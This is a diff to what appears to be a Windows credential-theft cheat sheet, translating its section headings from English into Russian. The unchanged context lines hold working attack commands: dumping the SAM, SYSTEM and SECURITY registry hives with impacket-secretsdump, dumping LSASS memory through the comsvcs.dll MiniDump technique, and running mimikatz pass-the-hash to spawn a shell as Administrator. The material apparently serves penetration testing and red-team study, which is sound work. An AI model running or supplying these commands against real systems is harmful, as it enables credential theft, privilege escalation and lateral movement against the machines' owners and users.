@@ -316,7 +316,7 @@ reg save HKLM\SECURITY C:\Temp\SECURITY
 python3 impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 ```
 
-Dump LSASS for credential extraction — mimikatz or comsvcs.dll LOLBIN
+Дамп LSASS для извлечения учётных данных — mimikatz или LOLBIN `comsvcs.dll`.
 
 ```
 # LSASS dump with Task Manager:
@@ -327,14 +327,16 @@ Dump LSASS for credential extraction — mimikatz or comsvcs.dll LOLBIN
 runas /noprofile /user:administrator "cmd /c rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).id C:\Temp\lsass.dmp full"
 ```
 
-mimikatz Pass-the-Hash — spawn cmd.exe with another user NTLM hash
+mimikatz Pass-the-Hash — запуск cmd.exe с NTLM-хэшем другого пользователя.
 
 ```
 # Mimikatz pass-the-hash:
 .\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLM_HASH> /run:cmd.exe" exit
 ```
 
-Windows Credential Manager — list and dump stored credentials
+**Диспетчер учётных данных Windows — перечисление и дамп сохранённых учётных данных.**
+
+(«Credential Manager» — «Диспетчер учётных данных».)
 
 ```
 # Windows Credential Manager:
